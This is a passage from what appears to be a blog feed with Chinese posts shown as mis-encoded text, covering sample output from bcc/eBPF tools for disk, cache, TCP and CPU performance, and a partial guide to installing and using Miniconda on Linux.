å»¶è¿Ÿï¼ˆä»è®¾å¤‡å‘å‡ºåˆ°å®Œæˆçš„æ—¶é—´ï¼‰ï¼Œå½“å·¥å…·ç»“æŸæ—¶ï¼ˆCtrl-Cï¼Œæˆ–ç»™å®šçš„æ—¶é—´é—´éš”ï¼‰ï¼Œå®ƒä¼šæ‰“å°å»¶è¿Ÿçš„ç›´æ–¹å›¾æ‘˜è¦ã€‚</p><p>è¿™å¯¹äºäº†è§£ç£ç›˜ I/O å»¶è¿Ÿè¶…å‡ºäº† iostat ç­‰å·¥å…·ç»™å‡ºçš„å¹³å‡æ—¶é—´éå¸¸æœ‰ç”¨ã€‚I/O å»¶è¿Ÿå¼‚å¸¸å€¼å°†åœ¨åˆ†å¸ƒç»“æŸæ—¶å¯è§ï¼Œä»¥åŠå¤šæ¨¡å¼åˆ†å¸ƒã€‚</p><h3 id="15-biosnoop"><a class="markdownIt-Anchor" href="#15-biosnoop"></a> 1.5. biosnoop</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># ./biosnoop</span><br><span class="hljs-attribute">TIME</span>(s)        COMM           PID    DISK    T  SECTOR    BYTES   LAT(ms)<br><span class="hljs-attribute">0</span>.<span class="hljs-number">000004001</span>    supervise      <span class="hljs-number">1950</span>   xvda<span class="hljs-number">1</span>   W  <span class="hljs-number">13092560</span>  <span class="hljs-number">4096</span>       <span class="hljs-number">0</span>.<span class="hljs-number">74</span><br><span class="hljs-attribute">0</span>.<span class="hljs-number">000178002</span>    supervise      <span class="hljs-number">1950</span>   xvda<span class="hljs-number">1</span>   W  <span class="hljs-number">13092432</span>  <span class="hljs-number">4096</span>       <span class="hljs-number">0</span>.<span class="hljs-number">61</span><br><span class="hljs-attribute">0</span>.<span class="hljs-number">001469001</span>    supervise      <span class="hljs-number">1956</span>   xvda<span class="hljs-number">1</span>   W  <span class="hljs-number">13092440</span>  <span class="hljs-number">4096</span>       <span class="hljs-number">1</span>.<span class="hljs-number">24</span><br><span class="hljs-attribute">0</span>.<span class="hljs-number">001588002</span>    supervise      <span class="hljs-number">1956</span>   xvda<span class="hljs-number">1</span>   W  <span class="hljs-number">13115128</span>  <span class="hljs-number">4096</span>       <span class="hljs-number">1</span>.<span class="hljs-number">09</span><br><span class="hljs-attribute">1</span>.<span class="hljs-number">022346001</span>    supervise      <span class="hljs-number">1950</span>   xvda<span class="hljs-number">1</span>   W  <span class="hljs-number">13115272</span>  <span class="hljs-number">4096</span>       <span class="hljs-number">0</span>.<span class="hljs-number">98</span><br><span class="hljs-attribute">1</span>.<span class="hljs-number">022568002</span>    supervise      <span class="hljs-number">1950</span>   xvda<span class="hljs-number">1</span>   W  <span class="hljs-number">13188496</span>  <span class="hljs-number">4096</span>       <span class="hljs-number">0</span>.<span class="hljs-number">93</span><span class="hljs-meta"></span><br><span class="hljs-meta">[...]</span><br></code></pre></div></td></tr></table></figure><p>biosnoop ä¸ºæ¯ä¸ªç£ç›˜ I/O æ‰“å°ä¸€è¡Œè¾“å‡ºï¼Œè¯¦ç»†ä¿¡æ¯åŒ…æ‹¬å»¶è¿Ÿï¼ˆä»è®¾å¤‡å‘å‡ºåˆ°å®Œæˆçš„æ—¶é—´ï¼‰ã€‚</p><p>è¿™ä½¿æ‚¨å¯ä»¥æ›´è¯¦ç»†åœ°æ£€æŸ¥ç£ç›˜ I/Oï¼Œå¹¶æŸ¥æ‰¾æŒ‰æ—¶é—´æ’åºçš„æ¨¡å¼ï¼ˆä¾‹å¦‚ï¼Œè¯»å–åœ¨å†™å…¥ä¹‹åæ’é˜Ÿï¼‰ã€‚è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨çš„ç³»ç»Ÿä»¥é«˜é€Ÿç‡æ‰§è¡Œç£ç›˜ I/Oï¼Œåˆ™è¾“å‡ºå°†æ˜¯å†—é•¿çš„ã€‚</p><h3 id="16-cachestat"><a class="markdownIt-Anchor" href="#16-cachestat"></a> 1.6. cachestat</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># ./cachestat</span><br>    <span class="hljs-attribute">HITS</span>   MISSES  DIRTIES  READ_HIT% WRITE_HIT%   BUFFERS_MB  CACHED_MB<br>    <span class="hljs-attribute">1074</span>       <span class="hljs-number">44</span>       <span class="hljs-number">13</span>      <span class="hljs-number">94</span>.<span class="hljs-number">9</span>%       <span class="hljs-number">2</span>.<span class="hljs-number">9</span>%            <span class="hljs-number">1</span>        <span class="hljs-number">223</span><br>    <span class="hljs-attribute">2195</span>      <span class="hljs-number">170</span>        <span class="hljs-number">8</span>      <span class="hljs-number">92</span>.<span class="hljs-number">5</span>%       <span class="hljs-number">6</span>.<span class="hljs-number">8</span>%            <span class="hljs-number">1</span>        <span class="hljs-number">143</span><br>     <span class="hljs-attribute">182</span>       <span class="hljs-number">53</span>       <span class="hljs-number">56</span>      <span class="hljs-number">53</span>.<span class="hljs-number">6</span>%       <span class="hljs-number">1</span>.<span class="hljs-number">3</span>%            <span class="hljs-number">1</span>        <span class="hljs-number">143</span><br>   <span class="hljs-attribute">62480</span>    <span class="hljs-number">40960</span>    <span class="hljs-number">20480</span>      <span class="hljs-number">40</span>.<span class="hljs-number">6</span>%      <span class="hljs-number">19</span>.<span class="hljs-number">8</span>%            <span class="hljs-number">1</span>        <span class="hljs-number">223</span><br>       <span class="hljs-attribute">7</span>        <span class="hljs-number">2</span>        <span class="hljs-number">5</span>      <span class="hljs-number">22</span>.<span class="hljs-number">2</span>%      <span class="hljs-number">22</span>.<span class="hljs-number">2</span>%            <span class="hljs-number">1</span>        <span class="hljs-number">223</span><br>     <span class="hljs-attribute">348</span>        <span class="hljs-number">0</span>        <span class="hljs-number">0</span>     <span class="hljs-number">100</span>.<span class="hljs-number">0</span>%       <span class="hljs-number">0</span>.<span class="hljs-number">0</span>%            <span class="hljs-number">1</span>        <span class="hljs-number">223</span><span class="hljs-meta"></span><br><span class="hljs-meta">[...]</span><br></code></pre></div></td></tr></table></figure><p>cachestat æ¯ç§’ï¼ˆæˆ–æ¯ä¸ªè‡ªå®šä¹‰é—´éš”ï¼‰æ‰“å°ä¸€è¡Œæ‘˜è¦ï¼Œæ˜¾ç¤ºæ¥è‡ªæ–‡ä»¶ç³»ç»Ÿç¼“å­˜çš„ç»Ÿè®¡ä¿¡æ¯ã€‚</p><p>ä½¿ç”¨å®ƒæ¥è¯†åˆ«ä½ç¼“å­˜å‘½ä¸­ç‡å’Œé«˜æœªå‘½ä¸­ç‡ï¼šè¿™ä¸ºæ€§èƒ½è°ƒæ•´æä¾›äº†ä¸€ä¸ªé¢†å…ˆä¼˜åŠ¿ã€‚</p><h3 id="17-tcpconnect"><a class="markdownIt-Anchor" href="#17-tcpconnect"></a> 1.7. tcpconnect</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># ./tcpconnect</span><br><span class="hljs-attribute">PID</span>    COMM         IP SADDR            DADDR            DPORT<br><span class="hljs-attribute">1479</span>   telnet       <span class="hljs-number">4</span>  <span class="hljs-number">127.0.0.1</span>        <span class="hljs-number">127.0.0.1</span>        <span class="hljs-number">23</span><br><span class="hljs-attribute">1469</span>   curl         <span class="hljs-number">4</span>  <span class="hljs-number">10.201.219.236</span>   <span class="hljs-number">54.245.105.25</span>    <span class="hljs-number">80</span><br><span class="hljs-attribute">1469</span>   curl         <span class="hljs-number">4</span>  <span class="hljs-number">10.201.219.236</span>   <span class="hljs-number">54.67.101.145</span>    <span class="hljs-number">80</span><br><span class="hljs-attribute">1991</span>   telnet       <span class="hljs-number">6</span>  ::<span class="hljs-number">1</span>              ::<span class="hljs-number">1</span>              <span class="hljs-number">23</span><br><span class="hljs-attribute">2015</span>   ssh          <span class="hljs-number">6</span>  fe<span class="hljs-number">80</span>::<span class="hljs-number">2000</span>:bff:fe<span class="hljs-number">82</span>:<span class="hljs-number">3</span>ac fe<span class="hljs-number">80</span>::<span class="hljs-number">2000</span>:bff:fe<span class="hljs-number">82</span>:<span class="hljs-number">3</span>ac <span class="hljs-number">22</span><span class="hljs-meta"></span><br><span class="hljs-meta">[...]</span><br></code></pre></div></td></tr></table></figure><p>tcpconnect ä¸ºæ¯ä¸ªæ´»åŠ¨çš„ TCP è¿æ¥ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡ connect()ï¼‰æ‰“å°ä¸€è¡Œè¾“å‡ºï¼Œè¯¦ç»†ä¿¡æ¯åŒ…æ‹¬æºåœ°å€å’Œç›®æ ‡åœ°å€ã€‚</p><p>å¯»æ‰¾å¯èƒ½æŒ‡å‘åº”ç”¨ç¨‹åºé…ç½®æ•ˆç‡ä½ä¸‹æˆ–å…¥ä¾µè€…çš„æ„å¤–è¿æ¥ã€‚</p><h3 id="18-tcpaccept"><a class="markdownIt-Anchor" href="#18-tcpaccept"></a> 1.8. tcpaccept</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># ./tcpaccept</span><br><span class="hljs-attribute">PID</span>    COMM         IP RADDR            LADDR            LPORT<br><span class="hljs-attribute">907</span>    sshd         <span class="hljs-number">4</span>  <span class="hljs-number">192.168.56.1</span>     <span class="hljs-number">192.168.56.102</span>   <span class="hljs-number">22</span><br><span class="hljs-attribute">907</span>    sshd         <span class="hljs-number">4</span>  <span class="hljs-number">127.0.0.1</span>        <span class="hljs-number">127.0.0.1</span>        <span class="hljs-number">22</span><br><span class="hljs-attribute">5389</span>   perl         <span class="hljs-number">6</span>  <span class="hljs-number">1234</span>:ab<span class="hljs-number">12</span>:<span class="hljs-number">2040</span>:<span class="hljs-number">5020</span>:<span class="hljs-number">2299</span>:<span class="hljs-number">0</span>:<span class="hljs-number">5</span>:<span class="hljs-number">0</span> <span class="hljs-number">1234</span>:ab<span class="hljs-number">12</span>:<span class="hljs-number">2040</span>:<span class="hljs-number">5020</span>:<span class="hljs-number">2299</span>:<span class="hljs-number">0</span>:<span class="hljs-number">5</span>:<span class="hljs-number">0</span> <span class="hljs-number">7001</span><span class="hljs-meta"></span><br><span class="hljs-meta">[...]</span><br></code></pre></div></td></tr></table></figure><p>tcpaccept ä¸ºæ¯ä¸ªè¢«åŠ¨ TCP è¿æ¥ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡ accept()ï¼‰æ‰“å°ä¸€è¡Œè¾“å‡ºï¼Œè¯¦ç»†ä¿¡æ¯åŒ…æ‹¬æºåœ°å€å’Œç›®æ ‡åœ°å€ã€‚</p><p>å¯»æ‰¾å¯èƒ½æŒ‡å‘åº”ç”¨ç¨‹åºé…ç½®æ•ˆç‡ä½ä¸‹æˆ–å…¥ä¾µè€…çš„æ„å¤–è¿æ¥ã€‚</p><h3 id="19-tcpretrans"><a class="markdownIt-Anchor" href="#19-tcpretrans"></a> 1.9. tcpretrans</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># ./tcpretrans</span><br><span class="hljs-attribute">TIME</span>     PID    IP LADDR:LPORT          T&gt; RADDR:RPORT          STATE<br><span class="hljs-attribute">01</span>:<span class="hljs-number">55</span>:<span class="hljs-number">05</span> <span class="hljs-number">0</span>      <span class="hljs-number">4</span>  <span class="hljs-number">10.153.223.157:22</span>    R&gt; <span class="hljs-number">69.53.245.40:34619</span>   ESTABLISHED<br><span class="hljs-attribute">01</span>:<span class="hljs-number">55</span>:<span class="hljs-number">05</span> <span class="hljs-number">0</span>      <span class="hljs-number">4</span>  <span class="hljs-number">10.153.223.157:22</span>    R&gt; <span class="hljs-number">69.53.245.40:34619</span>   ESTABLISHED<br><span class="hljs-attribute">01</span>:<span class="hljs-number">55</span>:<span class="hljs-number">17</span> <span class="hljs-number">0</span>      <span class="hljs-number">4</span>  <span class="hljs-number">10.153.223.157:22</span>    R&gt; <span class="hljs-number">69.53.245.40:22957</span>   ESTABLISHED<span class="hljs-meta"></span><br><span class="hljs-meta">[...]</span><br></code></pre></div></td></tr></table></figure><p>tcprerans ä¸ºæ¯ä¸ª TCP é‡ä¼ æ•°æ®åŒ…æ‰“å°ä¸€è¡Œè¾“å‡ºï¼Œè¯¦ç»†ä¿¡æ¯åŒ…æ‹¬æºåœ°å€å’Œç›®æ ‡åœ°å€ï¼Œä»¥åŠ TCP è¿æ¥çš„å†…æ ¸çŠ¶æ€ã€‚</p><p>TCP é‡ä¼ ä¼šå¯¼è‡´å»¶è¿Ÿå’Œååé‡é—®é¢˜ã€‚å¯¹äº ESTABLISHED é‡ä¼ ï¼Œå¯»æ‰¾ç½‘ç»œæ¨¡å¼ã€‚å¯¹äº SYN_SENTï¼Œè¿™å¯èƒ½æŒ‡å‘ç›®æ ‡å†…æ ¸ CPU é¥±å’Œå’Œå†…æ ¸æ•°æ®åŒ…ä¸¢å¤±ã€‚</p><h3 id="110-runqlat"><a class="markdownIt-Anchor" href="#110-runqlat"></a> 1.10. runqlat</h3><figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap"><span class="hljs-comment"># ./runqlat</span><br>Tracing run queue latency... Hit Ctrl-C to end.<br>^C<br>     usecs               : count     distribution<br>        <span class="hljs-number"> 0 </span>-&gt;<span class="hljs-number"> 1 </span>         :<span class="hljs-number"> 233 </span>     |***********                             |<br>        <span class="hljs-number"> 2 </span>-&gt;<span class="hljs-number"> 3 </span>         :<span class="hljs-number"> 742 </span>     |************************************    |<br>        <span class="hljs-number"> 4 </span>-&gt;<span class="hljs-number"> 7 </span>         :<span class="hljs-number"> 203 </span>     |**********                              |<br>        <span class="hljs-number"> 8 </span>-&gt;<span class="hljs-number"> 15 </span>        :<span class="hljs-number"> 173 </span>     |********                                |<br>       <span class="hljs-number"> 16 </span>-&gt;<span class="hljs-number"> 31 </span>        :<span class="hljs-number"> 24 </span>      |*                                       |<br>       <span class="hljs-number"> 32 </span>-&gt;<span class="hljs-number"> 63 </span>        :<span class="hljs-number"> 0 </span>       |                                        |<br>       <span class="hljs-number"> 64 </span>-&gt;<span class="hljs-number"> 127 </span>       :<span class="hljs-number"> 30 </span>      |*                                       |<br>      <span class="hljs-number"> 128 </span>-&gt;<span class="hljs-number"> 255 </span>       :<span class="hljs-number"> 6 </span>       |                                        |<br>      <span class="hljs-number"> 256 </span>-&gt;<span class="hljs-number"> 511 </span>       :<span class="hljs-number"> 3 </span>       |                                        |<br>      <span class="hljs-number"> 512 </span>-&gt;<span class="hljs-number"> 1023 </span>      :<span class="hljs-number"> 5 </span>       |                                        |<br>     <span class="hljs-number"> 1024 </span>-&gt;<span class="hljs-number"> 2047 </span>      :<span class="hljs-number"> 27 </span>      |*                                       |<br>     <span class="hljs-number"> 2048 </span>-&gt;<span class="hljs-number"> 4095 </span>      :<span class="hljs-number"> 30 </span>      |*                                       |<br>     <span class="hljs-number"> 4096 </span>-&gt;<span class="hljs-number"> 8191 </span>      :<span class="hljs-number"> 20 </span>      |                                        |<br>     <span class="hljs-number"> 8192 </span>-&gt;<span class="hljs-number"> 16383 </span>     :<span class="hljs-number"> 29 </span>      |*                                       |<br>    <span class="hljs-number"> 16384 </span>-&gt;<span class="hljs-number"> 32767 </span>     :<span class="hljs-number"> 809 </span>     |****************************************|<br>    <span class="hljs-number"> 32768 </span>-&gt;<span class="hljs-number"> 65535 </span>     :<span class="hljs-number"> 64 </span>      |***                                     |<br></code></pre></div></td></tr></table></figure><p>runqlat è®¡ç®—çº¿ç¨‹åœ¨ CPU è¿è¡Œé˜Ÿåˆ—ä¸Šç­‰å¾…çš„æ—¶é—´ï¼Œå¹¶å°†å…¶æ‰“å°ä¸ºç›´æ–¹å›¾ã€‚</p><p>è¿™å¯ä»¥å¸®åŠ©é‡åŒ–åœ¨ CPU é¥±å’ŒæœŸé—´ç­‰å¾…å¼€å¯ CPU æ‰€æŸå¤±çš„æ—¶é—´ã€‚</p><h3 id="111-profile"><a class="markdownIt-Anchor" href="#111-profile"></a> 1.11. profile</h3><figure class="highlight less"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs less"># ./<span class="hljs-selector-tag">profile</span><br><span class="hljs-selector-tag">Sampling</span> <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">49</span> <span class="hljs-selector-tag">Hertz</span> <span class="hljs-selector-tag">of</span> <span class="hljs-keyword">all</span> <span class="hljs-selector-tag">threads</span> <span class="hljs-selector-tag">by</span> <span class="hljs-selector-tag">user</span> + <span class="hljs-selector-tag">kernel</span> <span class="hljs-selector-tag">stack</span>... <span class="hljs-selector-tag">Hit</span> <span class="hljs-selector-tag">Ctrl-C</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">end</span>.<br>^<span class="hljs-selector-tag">C</span><br>    <span class="hljs-selector-tag">00007f31d76c3251</span> <span class="hljs-selector-attr">[unknown]</span><br>    <span class="hljs-selector-tag">47a2c1e752bf47f7</span> <span class="hljs-selector-attr">[unknown]</span><br>    <span class="hljs-selector-tag">-</span>                <span class="hljs-selector-tag">sign-file</span> (<span class="hljs-number">8877</span>)<br>        <span class="hljs-selector-tag">1</span><br><br>    <span class="hljs-selector-tag">ffffffff813d0af8</span> <span class="hljs-selector-tag">__clear_user</span><br>    <span class="hljs-selector-tag">ffffffff813d5277</span> <span class="hljs-selector-tag">iov_iter_zero</span><br>    <span class="hljs-selector-tag">ffffffff814ec5f2</span> <span class="hljs-selector-tag">read_iter_zero</span><br>    <span class="hljs-selector-tag">ffffffff8120be9d</span> <span class="hljs-selector-tag">__vfs_read</span><br>    <span class="hljs-selector-tag">ffffffff8120c385</span> <span class="hljs-selector-tag">vfs_read</span><br>    <span class="hljs-selector-tag">ffffffff8120d786</span> <span class="hljs-selector-tag">sys_read</span><br>    <span class="hljs-selector-tag">ffffffff817cc076</span> <span class="hljs-selector-tag">entry_SYSCALL_64_fastpath</span><br>    <span class="hljs-selector-tag">00007fc5652ad9b0</span> <span class="hljs-selector-tag">read</span><br>    <span class="hljs-selector-tag">-</span>                <span class="hljs-selector-tag">dd</span> (<span class="hljs-number">25036</span>)<br>        <span class="hljs-selector-tag">4</span><br><br>    <span class="hljs-selector-tag">0000000000400542</span> <span class="hljs-selector-tag">func_a</span><br>    <span class="hljs-selector-tag">0000000000400598</span> <span class="hljs-selector-tag">main</span><br>    <span class="hljs-selector-tag">00007f12a133e830</span> <span class="hljs-selector-tag">__libc_start_main</span><br>    <span class="hljs-selector-tag">083e258d4c544155</span> <span class="hljs-selector-attr">[unknown]</span><br>    <span class="hljs-selector-tag">-</span>                <span class="hljs-selector-tag">func_ab</span> (<span class="hljs-number">13549</span>)<br>        <span class="hljs-selector-tag">5</span><br><br><span class="hljs-selector-attr">[...]</span><br><br>    <span class="hljs-selector-tag">ffffffff8105eb66</span> <span class="hljs-selector-tag">native_safe_halt</span><br>    <span class="hljs-selector-tag">ffffffff8103659e</span> <span class="hljs-selector-tag">default_idle</span><br>    <span class="hljs-selector-tag">ffffffff81036d1f</span> <span class="hljs-selector-tag">arch_cpu_idle</span><br>    <span class="hljs-selector-tag">ffffffff810bba5a</span> <span class="hljs-selector-tag">default_idle_call</span><br>    <span class="hljs-selector-tag">ffffffff810bbd07</span> <span class="hljs-selector-tag">cpu_startup_entry</span><br>    <span class="hljs-selector-tag">ffffffff8104df55</span> <span class="hljs-selector-tag">start_secondary</span><br>    <span class="hljs-selector-tag">-</span>                <span class="hljs-selector-tag">swapper</span>/<span class="hljs-selector-tag">1</span> (<span class="hljs-number">0</span>)<br>        <span class="hljs-selector-tag">75</span><br></code></pre></div></td></tr></table></figure><p>profile æ˜¯ä¸€ä¸ª CPU åˆ†æå™¨ï¼Œå®ƒä»¥å®šæ—¶é—´éš”å¯¹å †æ ˆè·Ÿè¸ªè¿›è¡Œé‡‡æ ·ï¼Œå¹¶æ‰“å°å”¯ä¸€å †æ ˆè·Ÿè¸ªçš„æ‘˜è¦åŠå…¶å‡ºç°æ¬¡æ•°ã€‚</p><p>ä½¿ç”¨æ­¤å·¥å…·å¯äº†è§£æ¶ˆè€— CPU èµ„æºçš„ä»£ç è·¯å¾„ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eBPF</tag>
      
      <tag>bcc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>condaå®‰è£…ä½¿ç”¨</title>
    <link href="/posts/e053e15d/"/>
    <url>/posts/e053e15d/</url>
    
    <content type="html"><![CDATA[<h1 id="condaå®‰è£…ä½¿ç”¨"><a class="markdownIt-Anchor" href="#condaå®‰è£…ä½¿ç”¨"></a> condaå®‰è£…ä½¿ç”¨</h1><h2 id="linuxä¸‹condaå®‰è£…"><a class="markdownIt-Anchor" href="#linuxä¸‹condaå®‰è£…"></a> linuxä¸‹condaå®‰è£…</h2><ul><li><p>åœ¨å®˜ç½‘<a href="https://conda.io/en/latest/miniconda.html">miniconda</a>ä¸‹è½½æ–‡ä»¶</p></li><li><p>æ‰§è¡Œbashè„šæœ¬ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># æ–‡ä»¶åå¯èƒ½ä¼šæ›´æ”¹</span><br><span class="hljs-attribute">sh</span> Miniconda<span class="hljs-number">3</span>-py<span class="hljs-number">38</span>_<span class="hljs-number">4</span>.<span class="hljs-number">10</span>.<span class="hljs-number">3</span>-Linux-x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>.sh -b<br></code></pre></div></td></tr></table></figure></li><li><p>æ¥ä¸‹æ¥ï¼Œåˆå§‹åŒ–ç»ˆç«¯Shellï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥ç›´æ¥è¿è¡Œ<code>conda</code>ã€‚</p><figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade">~<span class="hljs-regexp">/miniconda3/</span>bin/conda init<br></code></pre></div></td></tr></table></figure><p>å¦‚æœé»˜è®¤shellä¸æ˜¯bash,æ¯”å¦‚æ˜¯zshå¯ä»¥æ‰§è¡Œä¸‹é¢çš„è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">conda init zsh<br></code></pre></div></td></tr></table></figure><p>è¿™ä¼šè‡ªå·±æ›´æ–°zshçš„é…ç½®æ–‡ä»¶~/.zshrc</p></li><li><p>ç°åœ¨å…³é—­å¹¶é‡æ–°æ‰“å¼€å½“å‰çš„shellã€‚ä½ åº”è¯¥èƒ½ç”¨ä¸‹é¢çš„å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–°çš„ç¯å¢ƒï¼š</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">conda</span> create --name d<span class="hljs-number">2</span>l python=<span class="hljs-number">3</span>.<span class="hljs-number">8</span> -y<br></code></pre></div></td></tr></table></figure><p>ç°åœ¨æ¿€æ´» <code>d2l</code> ç¯å¢ƒï¼š</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">conda</span> activate d<span class="hljs-number">2</span>l<br></code></pre></div></td></tr></table></figure><blockquote><p>æœ‰ä¸ªé—®é¢˜ï¼Œè¿™æ ·ä¹‹åcondaä¼šåœ¨æ¯æ¬¡ç»ˆç«¯æ‰“å¼€éƒ½é»˜è®¤å¼€å¯baseè™šæ‹Ÿç¯å¢ƒï¼Œå¦‚æœä¸æƒ³è¦é»˜è®¤å¼€è¿™ä¸ªç¯å¢ƒï¼Œå¯ä»¥è¾“å…¥ä¸‹é¢çš„å‘½ä»¤</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">conda<span class="hljs-built_in"> config </span>--<span class="hljs-builtin-name">set</span> auto_activate_base <span class="hljs-literal">false</span><br></code></pre></div></td></tr></table></figure><p>åœ¨æœ€æ–°çš„anacondaå®‰è£…åå°†å…¶åŠ å…¥åˆ°bashrcä¸­åï¼Œä¼šé»˜è®¤è‡ªåŠ¨æ¿€æ´»åŸºç¡€ç¯å¢ƒï¼Œä¸Šé¢çš„å‘½ä»¤å°±æ˜¯å°†å…¶è‡ªåŠ¨æ¿€æ´»çš„trueæ›´æ”¹ä¸ºfalseï¼Œå³å¯å…³é—­è™šæ‹Ÿç¯å¢ƒï¼Œä»¥åéœ€è¦ä½¿ç”¨ç›´æ¥ç”¨å‘½ä»¤è¡Œå³å¯ã€‚</p><figure class="highlight vala"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vala"><span class="hljs-meta">#å¼€å¯</span><br>conda activate spacename<span class="hljs-comment">//ç¯å¢ƒçš„åç§°</span><br><span class="hljs-meta">#å…³é—­</span><br>conda deactivate spacename<br><span class="hljs-meta">#åˆ—å‡ºå½“å‰ç¯å¢ƒå®‰è£…çš„åŒ…</span><br>conda list<br><span class="hljs-meta">#åˆ—å‡ºå½“å‰æ‰€æœ‰ç¯å¢ƒ</span><br>conda env list<br><span class="hljs-meta">#å®‰è£…åŒ…</span><br>conda install XX<br><span class="hljs-meta">#ä½¿ç”¨pipä¼šå®‰è£…åœ¨ç³»ç»Ÿpythonç¯å¢ƒä¸‹</span><br></code></pre></div></td></tr></table></figure></blockquote></li></ul><h2 id="windowsä¸‹condaå®‰è£…å’Œpycharmç¯å¢ƒé…ç½®"><a class="markdownIt-Anchor" href="#windowsä¸‹condaå®‰è£…å’Œpycharmç¯å¢ƒé…ç½®"></a> windowsä¸‹condaå®‰è£…å’Œpycharmç¯å¢ƒé…ç½®</h2><p>å¯ä»¥å‚è€ƒè¿™ä¸¤ç¯‡</p><p><a href="https://www.cnblogs.com/lxy764139720/p/15068466.html">Windowsé…ç½®æ·±åº¦å­¦ä¹ ç¯å¢ƒè¯¦ç»†æ•™ç¨‹ï¼ˆä¸€ï¼‰ï¼šå®‰è£…Pycharmå’ŒMiniconda</a></p><p><a href="https://www.cnblogs.com/lxy764139720/p/15068534.html">Windowsé…ç½®æ·±åº¦å­¦ä¹ 